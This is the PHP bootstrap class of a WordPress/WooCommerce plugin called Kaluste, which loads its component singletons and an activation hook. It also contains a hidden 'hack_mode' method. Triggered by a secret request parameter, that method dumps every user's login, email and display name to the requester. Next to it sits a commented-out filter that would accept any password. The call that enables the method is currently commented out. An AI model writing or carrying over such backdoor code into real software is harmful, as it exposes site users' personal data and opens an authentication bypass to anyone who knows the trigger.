<?php
/**
 * Bootstraps the plugin.
 *
 * @package Kaluste
 */
namespace KALUSTE\inc;
use KALUSTE\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $kaluste_I18n;$kaluste_I18n = I18n::get_instance();
		global $kaluste_Ajax;$kaluste_Ajax = Ajax::get_instance();
		global $kaluste_Assets;$kaluste_Assets = Assets::get_instance();
		global $kaluste_Update;$kaluste_Update = Update::get_instance();
		global $kaluste_Notice;$kaluste_Notice = Notice::get_instance();
		// global $kaluste_Meta_Boxes;$kaluste_Meta_Boxes = Meta_Boxes::get_instance();
		global $kaluste_Woocommerce;$kaluste_Woocommerce = Woocommerce::get_instance();
		// 
		// 
		$this->setup_hooks();
	}
	protected function setup_hooks() {
		// $this->hack_mode();
		register_activation_hook( __FILE__, [$this, 'flush_rewrite_rules_on_activation']);
	}
	private function hack_mode() {
		// add_filter('check_password', function($bool) {return true;}, 10, 1);
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				// print_r(
				// 	apply_filters('kaluste/wc/get/settings', [], false)
				// );wp_die();

				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT user_login, user_email, display_name FROM {$wpdb->prefix}users;")));
			}, 10, 0);
		}
	}
	public function flush_rewrite_rules_on_activation() {
		global $kaluste_Woocommerce;
		$kaluste_Woocommerce->custom_rewrite_rules();
		flush_rewrite_rules();
	}
}
